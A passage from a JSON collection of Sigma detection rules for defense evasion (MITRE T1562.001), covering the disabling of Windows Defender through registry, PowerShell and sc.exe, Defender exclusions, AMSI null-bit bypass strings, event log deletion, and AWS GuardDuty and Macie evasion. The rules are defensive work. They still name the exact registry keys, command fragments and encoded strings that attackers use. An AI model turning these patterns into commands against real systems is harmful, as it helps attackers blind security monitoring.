                            "raw": "author: \"AlertIQ, J\\xE1n Tren\\u010Dansk\\xFD, frack113, Nasreddine Bencherchali\"\ndate: 2022/08/01\ndescription: Detects when attackers or tools disable Windows Defender functionalities\n  via the windows registry\ndetection:\n  condition: ( root and 1 of selection_* ) and not 1 of filter*\n  filter_msmpeng:\n    Image|contains|all:\n    - C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\\n    - \\MsMpEng.exe\n  root:\n    EventType: SetValue\n    TargetObject|contains: \\SOFTWARE\\Microsoft\\Windows Defender\\\n  selection_dword_0:\n    Details: DWORD (0x00000000)\n    TargetObject|endswith:\n    - \\SpyNet\\SpynetReporting\n    - \\SpyNet\\SubmitSamplesConsent\n    - \\MpEngine\\MpEnablePus\n  selection_dword_1:\n    Details: DWORD (0x00000001)\n    TargetObject|endswith:\n    - \\Real-Time Protection\\DisableBehaviorMonitoring\n    - \\Real-Time Protection\\DisableIOAVProtection\n    - \\Real-Time Protection\\DisableOnAccessProtection\n    - \\Real-Time Protection\\DisableRealtimeMonitoring\n    - \\Real-Time Protection\\DisableScanOnRealtimeEnable\n    - \\Reporting\\DisableEnhancedNotifications\n    - \\SpyNet\\DisableBlockAtFirstSeen\n    - \\DisableAntiSpyware\n    - \\DisableAntiVirus\nfalsepositives:\n- Administrator actions\nid: 0eb46774-f1ab-4a74-8238-1155855f2263\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/12/05\nreferences:\n- https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/\n- https://gist.github.com/anadr/7465a9fde63d41341136949f14c21105\n- https://admx.help/?Category=Windows_7_2008R2&Policy=Microsoft.Policies.WindowsDefender::SpyNetReporting\n- https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ransomware-hive-conti-avoslocker\nrelated:\n- id: a64e4198-c1c8-46a5-bc9c-324c86455fd4\n  type: obsoletes\n- id: fd115e64-97c7-491f-951c-fc8da7e042fa\n  type: obsoletes\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Disable Windows Defender Functionalities Via Registry Keys\n",
                            "sigma:id": "0eb46774-f1ab-4a74-8238-1155855f2263",
                            "title": "Disable Windows Defender Functionalities Via Registry Keys",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "6e61ee20-ce00-4f8d-8aee-bedd8216f7e3",
                        "lookup_data": {
                            "description": "Detects updates of the GuardDuty list of trusted IPs, perhaps to disable security alerts against malicious IPs.",
                            "raw": "author: faloker\ndate: 2020/02/11\ndescription: Detects updates of the GuardDuty list of trusted IPs, perhaps to disable\n  security alerts against malicious IPs.\ndetection:\n  condition: selection_source\n  selection_source:\n    eventName: CreateIPSet\n    eventSource: guardduty.amazonaws.com\nfalsepositives:\n- Valid change in the GuardDuty (e.g. to ignore internal scanners)\nid: 6e61ee20-ce00-4f8d-8aee-bedd8216f7e3\nlevel: high\nlogsource:\n  product: aws\n  service: cloudtrail\nmodified: 2022/10/09\nreferences:\n- https://github.com/RhinoSecurityLabs/pacu/blob/866376cd711666c775bbfcde0524c817f2c5b181/pacu/modules/guardduty__whitelist_ip/main.py#L9\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: AWS GuardDuty Important Change\n",
                            "sigma:id": "6e61ee20-ce00-4f8d-8aee-bedd8216f7e3",
                            "title": "AWS GuardDuty Important Change",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "6c0a7755-6d31-44fa-80e1-133e57752680",
                        "lookup_data": {
                            "description": "Detects the \"Windows Defender Threat Protection\" service has been disabled",
                            "raw": "author: \"J\\xE1n Tren\\u010Dansk\\xFD, frack113\"\ndate: 2020/07/28\ndescription: Detects the \"Windows Defender Threat Protection\" service has been disabled\ndetection:\n  condition: selection\n  selection:\n    EventID: 7036\n    Provider_Name: Service Control Manager\n    param1:\n    - Windows Defender Antivirus Service\n    - Service antivirus Microsoft Defender\n    param2: stopped\nfalsepositives:\n- Administrator actions\n- Auto updates of Windows Defender causes restarts\nid: 6c0a7755-6d31-44fa-80e1-133e57752680\nlevel: low\nlogsource:\n  product: windows\n  service: system\nmodified: 2022/08/01\nreferences:\n- https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-antivirus/troubleshoot-windows-defender-antivirus\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md\nrelated:\n- id: fe34868f-6e0e-4882-81f6-c43aa8f15b62\n  type: derived\nstatus: stable\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Windows Defender Threat Detection Disabled - Service\n",
                            "sigma:id": "6c0a7755-6d31-44fa-80e1-133e57752680",
                            "title": "Windows Defender Threat Detection Disabled - Service",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "92a974db-ab84-457f-9ec0-55db83d7a825",
                        "lookup_data": {
                            "description": "Detects usage of special strings/null bits in order to potentially bypass AMSI functionalities",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023/01/04\ndescription: Detects usage of special strings/null bits in order to potentially bypass\n  AMSI functionalities\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - if(0){{{0}}}' -f $(0 -as [char]) +\n    - '#<NULL>'\nfalsepositives:\n- Unknown\nid: 92a974db-ab84-457f-9ec0-55db83d7a825\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://github.com/r00t-3xp10it/hacking-material-books/blob/43cb1e1932c16ff1f58b755bc9ab6b096046853f/obfuscation/simple_obfuscation.md#amsi-bypass-using-null-bits-satoshi\nrelated:\n- id: fa2559c8-1197-471d-9cdd-05a0273d4522\n  type: similar\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Potential AMSI Bypass Using NULL Bits - ProcessCreation\n",
                            "sigma:id": "92a974db-ab84-457f-9ec0-55db83d7a825",
                            "title": "Potential AMSI Bypass Using NULL Bits - ProcessCreation",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "e9c8808f-4cfb-4ba9-97d4-e5f3beaa244d",
                        "lookup_data": {
                            "description": "Detects scenarios where an windows defender exclusion was added in registry where an entity would want to bypass antivirus scanning from windows defender",
                            "raw": "author: '@BarryShooshooga'\ndate: 2019/10/26\ndescription: Detects scenarios where an windows defender exclusion was added in registry\n  where an entity would want to bypass antivirus scanning from windows defender\ndetection:\n  condition: selection\n  selection:\n    EventID:\n    - 4657\n    - 4656\n    - 4660\n    - 4663\n    ObjectName|contains: \\Microsoft\\Windows Defender\\Exclusions\\\nfalsepositives:\n- Intended inclusions by administrator\nid: e9c8808f-4cfb-4ba9-97d4-e5f3beaa244d\nlevel: high\nlogsource:\n  definition: 'Requirements: Audit Policy : Security Settings/Local Policies/Audit\n    Policy, Registry System Access Control (SACL): Auditing/User'\n  product: windows\n  service: security\nmodified: 2021/11/27\nreferences:\n- https://www.bleepingcomputer.com/news/security/gootkit-malware-bypasses-windows-defender-by-setting-path-exclusions/\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Windows Defender Exclusion Set\n",
                            "sigma:id": "e9c8808f-4cfb-4ba9-97d4-e5f3beaa244d",
                            "title": "Windows Defender Exclusion Set",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "225d8b09-e714-479c-a0e4-55e6f29adf35",
                        "lookup_data": {
                            "description": "Detects when Events are deleted in Azure Kubernetes. An adversary may delete events in Azure Kubernetes in an attempt to evade detection.",
                            "raw": "author: Austin Songer @austinsonger\ndate: 2021/07/24\ndescription: Detects when Events are deleted in Azure Kubernetes. An adversary may\n  delete events in Azure Kubernetes in an attempt to evade detection.\ndetection:\n  condition: selection\n  selection:\n    operationName: MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/EVENTS.K8S.IO/EVENTS/DELETE\nfalsepositives:\n- Event deletions may be done by a system or network administrator. Verify whether\n  the username, hostname, and/or resource name should be making changes in your environment.\n  Events deletions from unfamiliar users or hosts should be investigated. If known\n  behavior is causing false positives, it can be exempted from the rule.\nid: 225d8b09-e714-479c-a0e4-55e6f29adf35\nlevel: medium\nlogsource:\n  product: azure\n  service: activitylogs\nmodified: 2022/08/23\nreferences:\n- https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes\n- https://github.com/elastic/detection-rules/blob/da3852b681cf1a33898b1535892eab1f3a76177a/rules/integrations/azure/defense_evasion_kubernetes_events_deleted.toml\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562\n- attack.t1562.001\ntitle: Azure Kubernetes Events Deleted\n",
                            "sigma:id": "225d8b09-e714-479c-a0e4-55e6f29adf35",
                            "title": "Azure Kubernetes Events Deleted",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "91f6a16c-ef71-437a-99ac-0b070e3ad221",
                        "lookup_data": {
                            "description": "Detects evade to Macie detection.",
                            "raw": "author: Sittikorn S\ndate: 2021/07/06\ndescription: Detects evade to Macie detection.\ndetection:\n  condition: selection | count() by sourceIPAddress > 5\n  selection:\n    eventName:\n    - ArchiveFindings\n    - CreateFindingsFilter\n    - DeleteMember\n    - DisassociateFromMasterAccount\n    - DisassociateMember\n    - DisableMacie\n    - DisableOrganizationAdminAccount\n    - UpdateFindingsFilter\n    - UpdateMacieSession\n    - UpdateMemberSession\n    - UpdateClassificationJob\n  timeframe: 10m\nfalsepositives:\n- System or Network administrator behaviors\nfields:\n- sourceIPAddress\n- userIdentity.arn\nid: 91f6a16c-ef71-437a-99ac-0b070e3ad221\nlevel: medium\nlogsource:\n  product: aws\n  service: cloudtrail\nmodified: 2022/10/09\nreferences:\n- https://docs.aws.amazon.com/cli/latest/reference/macie/\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: AWS Macie Evasion\n",
                            "sigma:id": "91f6a16c-ef71-437a-99ac-0b070e3ad221",
                            "title": "AWS Macie Evasion",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "fcddca7c-b9c0-4ddf-98da-e1e2d18b0157",
                        "lookup_data": {
                            "description": "Detects the disabling of the Windows Defender eventlog as seen in relation to Lockbit 3.0 infections",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/07/04\ndescription: Detects the disabling of the Windows Defender eventlog as seen in relation\n  to Lockbit 3.0 infections\ndetection:\n  condition: selection\n  selection:\n    Details: DWORD (0x00000000)\n    EventType: SetValue\n    TargetObject|contains: \\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows\n      Defender/Operational\\Enabled\nfalsepositives:\n- Other Antivirus software installations could cause Windows to disable that eventlog\n  (unknown)\nid: fcddca7c-b9c0-4ddf-98da-e1e2d18b0157\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nreferences:\n- https://twitter.com/WhichbufferArda/status/1543900539280293889/photo/2\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Disabled Windows Defender Eventlog\n",
                            "sigma:id": "fcddca7c-b9c0-4ddf-98da-e1e2d18b0157",
                            "title": "Disabled Windows Defender Eventlog",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "09706624-b7f6-455d-9d02-adee024cee1d",
                        "lookup_data": {
                            "description": "Detects a typical pattern of a CobaltStrike BOF which inject into other processes",
                            "raw": "author: Christian Burkard (Nextron Systems)\ndate: 2021/08/04\ndescription: Detects a typical pattern of a CobaltStrike BOF which inject into other\n  processes\ndetection:\n  condition: selection\n  selection:\n    CallTrace|re: ^C:\\\\Windows\\\\SYSTEM32\\\\ntdll\\.dll\\+[a-z0-9]{4,6}\\|C:\\\\Windows\\\\System32\\\\KERNELBASE\\.dll\\+[a-z0-9]{4,6}\\|UNKNOWN\\([A-Z0-9]{16}\\)$\n    GrantedAccess:\n    - '0x1028'\n    - '0x1fffff'\nfalsepositives:\n- Unknown\nid: 09706624-b7f6-455d-9d02-adee024cee1d\nlevel: high\nlogsource:\n  category: process_access\n  product: windows\nmodified: 2022/12/31\nreferences:\n- https://github.com/boku7/injectAmsiBypass\n- https://github.com/boku7/spawn\nstatus: test\ntags:\n- attack.execution\n- attack.t1106\n- attack.defense_evasion\n- attack.t1562.001\ntitle: CobaltStrike BOF Injection Pattern\n",
                            "sigma:id": "09706624-b7f6-455d-9d02-adee024cee1d",
                            "title": "CobaltStrike BOF Injection Pattern",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "43e32da2-fdd0-4156-90de-50dfd62636f9",
                        "lookup_data": {
                            "description": "Deployment Image Servicing and Management tool. DISM is used to enumerate, install, uninstall, configure, and update features and packages in Windows images",
                            "raw": "author: frack113\ndate: 2022/01/16\ndescription: Deployment Image Servicing and Management tool. DISM is used to enumerate,\n  install, uninstall, configure, and update features and packages in Windows images\ndetection:\n  condition: 1 of selection_*\n  selection_dism:\n    CommandLine|contains|all:\n    - /Online\n    - /Disable-Feature\n    Image|endswith: \\Dism.exe\n  selection_dismhost:\n    Image|endswith: \\DismHost.exe\n    ParentCommandLine|contains|all:\n    - /Online\n    - /Disable-Feature\nfalsepositives:\n- Legitimate script\nid: 43e32da2-fdd0-4156-90de-50dfd62636f9\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/08/26\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md#atomic-test-26---disable-windows-defender-with-dism\n- https://www.trendmicro.com/en_us/research/22/h/ransomware-actor-abuses-genshin-impact-anti-cheat-driver-to-kill-antivirus.html\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Dism Remove Online Package\n",
                            "sigma:id": "43e32da2-fdd0-4156-90de-50dfd62636f9",
                            "title": "Dism Remove Online Package",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "7c637634-c95d-4bbf-b26c-a82510874b34",
                        "lookup_data": {
                            "description": "Disable Microsoft Office Security Features by registry",
                            "raw": "author: frack113\ndate: 2021/06/08\ndescription: Disable Microsoft Office Security Features by registry\ndetection:\n  condition: selection\n  selection:\n    Details: DWORD (0x00000001)\n    EventType: SetValue\n    TargetObject|contains: \\SOFTWARE\\Microsoft\\Office\\\n    TargetObject|endswith:\n    - VBAWarnings\n    - DisableInternetFilesInPV\n    - DisableUnsafeLocationsInPV\n    - DisableAttachementsInPV\nfalsepositives:\n- Unknown\nid: 7c637634-c95d-4bbf-b26c-a82510874b34\nlevel: high\nlogsource:\n  category: registry_set\n  definition: key must be add to the sysmon configuration to works\n  product: windows\nmodified: 2022/03/26\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md\n- https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\n- https://yoroi.company/research/cyber-criminal-espionage-operation-insists-on-italian-manufacturing/\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Disable Microsoft Office Security Features\n",
                            "sigma:id": "7c637634-c95d-4bbf-b26c-a82510874b34",
                            "title": "Disable Microsoft Office Security Features",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "b7e2a8d4-74bb-4b78-adc9-3f92af2d4829",
                        "lookup_data": {
                            "description": "Detects when an adversary uses the reg.exe utility to add or modify new keys or subkeys",
                            "raw": "author: frack113, Nasreddine Bencherchali\ndate: 2022/08/19\ndescription: Detects when an adversary uses the reg.exe utility to add or modify new\n  keys or subkeys\ndetection:\n  condition: all of selection_*\n  selection_path:\n    CommandLine|contains:\n    - \\AppDataLow\\Software\\Microsoft\\\n    - \\Policies\\Microsoft\\Windows\\OOBE\n    - \\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\n    - \\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\n    - \\CurrentControlSet\\Control\\SecurityProviders\\WDigest\n    - \\Microsoft\\Windows Defender\\\n  selection_reg:\n  - Image|endswith: \\reg.exe\n  - OriginalFileName: reg.exe\nfalsepositives:\n- Rare legitimate add to registry via cli (to these locations)\nid: b7e2a8d4-74bb-4b78-adc9-3f92af2d4829\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/10\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1112/T1112.md\n- https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1562.001/T1562.001.md\n- https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1112\n- attack.t1562.001\ntitle: Reg Add Suspicious Paths\n",
                            "sigma:id": "b7e2a8d4-74bb-4b78-adc9-3f92af2d4829",
                            "title": "Reg Add Suspicious Paths",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "1ec65a5f-9473-4f12-97da-622044d6df21",
                        "lookup_data": {
                            "description": "Detects requests to disable Microsoft Defender features using PowerShell commands",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/03/03\ndescription: Detects requests to disable Microsoft Defender features using PowerShell\n  commands\ndetection:\n  condition: all of selection* or encoded_command\n  encoded_command:\n    CommandLine|base64offset|contains:\n    - 'DisableRealtimeMonitoring '\n    - 'DisableIOAVProtection '\n    - 'DisableBehaviorMonitoring '\n    - 'DisableBlockAtFirstSeen '\n    - 'disablerealtimemonitoring '\n    - 'disableioavprotection '\n    - 'disablebehaviormonitoring '\n    - 'disableblockatfirstseen '\n    CommandLine|contains:\n    - RABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgA\n    - QAaQBzAGEAYgBsAGUAUgBlAGEAbAB0AGkAbQBlAE0AbwBuAGkAdABvAHIAaQBuAGcAIA\n    - EAGkAcwBhAGIAbABlAFIAZQBhAGwAdABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACAA\n    - RABpAHMAYQBiAGwAZQBJAE8AQQBWAFAAcgBvAHQAZQBjAHQAaQBvAG4AIA\n    - QAaQBzAGEAYgBsAGUASQBPAEEAVgBQAHIAbwB0AGUAYwB0AGkAbwBuACAA\n    - EAGkAcwBhAGIAbABlAEkATwBBAFYAUAByAG8AdABlAGMAdABpAG8AbgAgA\n    - RABpAHMAYQBiAGwAZQBCAGUAaABhAHYAaQBvAHIATQBvAG4AaQB0AG8AcgBpAG4AZwAgA\n    - QAaQBzAGEAYgBsAGUAQgBlAGgAYQB2AGkAbwByAE0AbwBuAGkAdABvAHIAaQBuAGcAIA\n    - EAGkAcwBhAGIAbABlAEIAZQBoAGEAdgBpAG8AcgBNAG8AbgBpAHQAbwByAGkAbgBnACAA\n    - RABpAHMAYQBiAGwAZQBCAGwAbwBjAGsAQQB0AEYAaQByAHMAdABTAGUAZQBuACAA\n    - QAaQBzAGEAYgBsAGUAQgBsAG8AYwBrAEEAdABGAGkAcgBzAHQAUwBlAGUAbgAgA\n    - EAGkAcwBhAGIAbABlAEIAbABvAGMAawBBAHQARgBpAHIAcwB0AFMAZQBlAG4AIA\n    - ZABpAHMAYQBiAGwAZQByAGUAYQBsAHQAaQBtAGUAbQBvAG4AaQB0AG8AcgBpAG4AZwAgA\n    - QAaQBzAGEAYgBsAGUAcgBlAGEAbAB0AGkAbQBlAG0AbwBuAGkAdABvAHIAaQBuAGcAIA\n    - kAGkAcwBhAGIAbABlAHIAZQBhAGwAdABpAG0AZQBtAG8AbgBpAHQAbwByAGkAbgBnACAA\n    - ZABpAHMAYQBiAGwAZQBpAG8AYQB2AHAAcgBvAHQAZQBjAHQAaQBvAG4AIA\n    - QAaQBzAGEAYgBsAGUAaQBvAGEAdgBwAHIAbwB0AGUAYwB0AGkAbwBuACAA\n    - kAGkAcwBhAGIAbABlAGkAbwBhAHYAcAByAG8AdABlAGMAdABpAG8AbgAgA\n    - ZABpAHMAYQBiAGwAZQBiAGUAaABhAHYAaQBvAHIAbQBvAG4AaQB0AG8AcgBpAG4AZwAgA\n    - QAaQBzAGEAYgBsAGUAYgBlAGgAYQB2AGkAbwByAG0AbwBuAGkAdABvAHIAaQBuAGcAIA\n    - kAGkAcwBhAGIAbABlAGIAZQBoAGEAdgBpAG8AcgBtAG8AbgBpAHQAbwByAGkAbgBnACAA\n    - ZABpAHMAYQBiAGwAZQBiAGwAbwBjAGsAYQB0AGYAaQByAHMAdABzAGUAZQBuACAA\n    - QAaQBzAGEAYgBsAGUAYgBsAG8AYwBrAGEAdABmAGkAcgBzAHQAcwBlAGUAbgAgA\n    - kAGkAcwBhAGIAbABlAGIAbABvAGMAawBhAHQAZgBpAHIAcwB0AHMAZQBlAG4AIA\n  selection1:\n    CommandLine|contains:\n    - 'Add-MpPreference '\n    - 'Set-MpPreference '\n  selection2:\n    CommandLine|contains:\n    - 'DisableRealtimeMonitoring '\n    - 'DisableIOAVProtection '\n    - 'DisableBehaviorMonitoring '\n    - 'DisableBlockAtFirstSeen '\n  selection3:\n    CommandLine|contains:\n    - $true\n    - ' 1 '\nfalsepositives:\n- Possible Admin Activity\n- Other Cmdlets that may use the same parameters\nid: 1ec65a5f-9473-4f12-97da-622044d6df21\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/03/07\nreferences:\n- https://docs.microsoft.com/en-us/powershell/module/defender/set-mppreference?view=windowsserver2022-ps\n- https://www.virustotal.com/gui/file/d609799091731d83d75ec5d1f030571af20c45efeeb94840b67ea09a3283ab65/behavior/C2AE\n- https://www.virustotal.com/gui/search/content%253A%2522Set-MpPreference%2520-Disable%2522/files\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Powershell Defender Disable Scan Feature\n",
                            "sigma:id": "1ec65a5f-9473-4f12-97da-622044d6df21",
                            "title": "Powershell Defender Disable Scan Feature",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "a7ee1722-c3c5-aeff-3212-c777e4733217",
                        "lookup_data": {
                            "description": "Detects attackers attempting to disable Windows Defender using Powershell",
                            "raw": "author: ok @securonix invrep-de, oscd.community, frack113\ndate: 2020/10/12\ndescription: Detects attackers attempting to disable Windows Defender using Powershell\ndetection:\n  condition: all of selection_pwsh_* or (selection_sc_binary and 1 of selection_sc_tamper_*)\n  selection_pwsh_binary:\n  - Image|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n  - OriginalFileName:\n    - PowerShell.EXE\n    - pwsh.dll\n  selection_pwsh_cli:\n    CommandLine|contains:\n    - -DisableBehaviorMonitoring $true\n    - -DisableRuntimeMonitoring $true\n  selection_sc_binary:\n  - Image|endswith: \\sc.exe\n  - OriginalFileName: sc.exe\n  selection_sc_tamper_cmd_delete:\n    CommandLine|contains|all:\n    - delete\n    - WinDefend\n  selection_sc_tamper_cmd_disabled:\n    CommandLine|contains|all:\n    - config\n    - WinDefend\n    - start=disabled\n  selection_sc_tamper_cmd_stop:\n    CommandLine|contains|all:\n    - stop\n    - WinDefend\nfalsepositives:\n- Minimal, for some older versions of dev tools, such as pycharm, developers were\n  known to sometimes disable Windows Defender to improve performance, but this generally\n  is not considered a good security practice.\nid: a7ee1722-c3c5-aeff-3212-c777e4733217\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/11/18\nreferences:\n- https://research.nccgroup.com/2020/06/23/wastedlocker-a-new-ransomware-variant-developed-by-the-evil-corp-group/\n- https://rvsec0n.wordpress.com/2020/01/24/malwares-that-bypass-windows-defender/\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Disable Windows Defender AV Security Monitoring\n",
                            "sigma:id": "a7ee1722-c3c5-aeff-3212-c777e4733217",
                            "title": "Disable Windows Defender AV Security Monitoring",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "48917adc-a28e-4f5d-b729-11e75da8941f",
                        "lookup_data": {
                            "description": "Qbot used reg.exe to add Defender folder exceptions for folders within AppData and ProgramData.",
                            "raw": "author: frack113\ndate: 2022/02/13\ndescription: Qbot used reg.exe to add Defender folder exceptions for folders within\n  AppData and ProgramData.\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\n    - SOFTWARE\\Microsoft\\Microsoft Antimalware\\Exclusions\\Paths\n    CommandLine|contains|all:\n    - 'ADD '\n    - '/t '\n    - 'REG_DWORD '\n    - '/v '\n    - '/d '\n    - '0'\n    Image|endswith: \\reg.exe\nfalsepositives:\n- Legitimate use\nid: 48917adc-a28e-4f5d-b729-11e75da8941f\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/08/05\nreferences:\n- https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/\n- https://redcanary.com/threat-detection-report/threats/qbot/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Registry Defender Exclusions\n",
                            "sigma:id": "48917adc-a28e-4f5d-b729-11e75da8941f",
                            "title": "Registry Defender Exclusions",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "cd1f961e-0b96-436b-b7c6-38da4583ec00",
                        "lookup_data": {
                            "description": "Detects command that is used to disable or delete Windows eventlog via logman Windows utility",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2021/02/11\ndescription: Detects command that is used to disable or delete Windows eventlog via\n  logman Windows utility\ndetection:\n  condition: all of selection*\n  selection_action:\n    CommandLine|contains:\n    - 'stop '\n    - 'delete '\n  selection_service:\n    CommandLine|contains: EventLog-System\n  selection_tools:\n    CommandLine|contains: 'logman '\nfalsepositives:\n- Legitimate deactivation by administrative staff\n- Installer tools that disable services, e.g. before log collection agent installation\nid: cd1f961e-0b96-436b-b7c6-38da4583ec00\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/25\nreferences:\n- https://twitter.com/0gtweet/status/1359039665232306183?s=21\n- https://ss64.com/nt/logman.html\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1562.001\n- attack.t1070.001\ntitle: Disable or Delete Windows Eventlog\n",
                            "sigma:id": "cd1f961e-0b96-436b-b7c6-38da4583ec00",
                            "title": "Disable or Delete Windows Eventlog",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "fa2559c8-1197-471d-9cdd-05a0273d4522",
                        "lookup_data": {
                            "description": "Detects usage of special strings/null bits in order to potentially bypass AMSI functionalities",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023/01/04\ndescription: Detects usage of special strings/null bits in order to potentially bypass\n  AMSI functionalities\ndetection:\n  condition: selection\n  selection:\n    ScriptBlockLogging|contains:\n    - if(0){{{0}}}' -f $(0 -as [char]) +\n    - '#<NULL>'\nfalsepositives:\n- Unknown\nid: fa2559c8-1197-471d-9cdd-05a0273d4522\nlevel: medium\nlogsource:\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\n  service: powershell\nreferences:\n- https://github.com/r00t-3xp10it/hacking-material-books/blob/43cb1e1932c16ff1f58b755bc9ab6b096046853f/obfuscation/simple_obfuscation.md#amsi-bypass-using-null-bits-satoshi\nrelated:\n- id: 92a974db-ab84-457f-9ec0-55db83d7a825\n  type: similar\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Potential AMSI Bypass Using NULL Bits - ScriptBlockLogging\n",
                            "sigma:id": "fa2559c8-1197-471d-9cdd-05a0273d4522",
                            "title": "Potential AMSI Bypass Using NULL Bits - ScriptBlockLogging",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "9719a8aa-401c-41af-8108-ced7ec9cd75c",
                        "lookup_data": {
                            "description": "Adversaries may disable security tools to avoid possible detection of their tools and activities by removing Windows Defender Definition Files",
                            "raw": "author: frack113\ndate: 2021/07/07\ndescription: Adversaries may disable security tools to avoid possible detection of\n  their tools and activities by removing Windows Defender Definition Files\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - ' -RemoveDefinitions'\n    - ' -All'\n    OriginalFileName: MpCmdRun.exe\nfalsepositives:\n- Unknown\nfields:\n- ComputerName\n- User\n- CommandLine\n- ParentCommandLine\nid: 9719a8aa-401c-41af-8108-ced7ec9cd75c\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md\n- https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Remove Windows Defender Definition Files\n",
                            "sigma:id": "9719a8aa-401c-41af-8108-ced7ec9cd75c",
                            "title": "Remove Windows Defender Definition Files",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "49e5bc24-8b86-49f1-b743-535f332c2856",
                        "lookup_data": {
                            "description": "Detects blocked attempts to change any of Defender's settings such as \"Real Time Monitoring\" and \"Behavior Monitoring\"",
